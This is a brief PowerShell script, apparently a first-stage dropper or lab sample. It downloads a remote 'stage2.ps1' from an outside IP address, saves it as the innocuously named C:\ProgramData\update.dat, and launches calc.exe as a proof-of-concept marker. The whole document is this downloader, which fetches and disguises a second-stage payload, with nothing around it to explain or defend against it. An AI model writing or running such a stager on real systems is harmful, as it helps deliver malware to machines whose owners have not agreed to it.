
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://203.0.113.219/stage2.ps1",
    [string]$LocalPath = "C:\ProgramData\update.dat"
)
(New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $LocalPath)
Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue
$StageMarker = "stage-29"
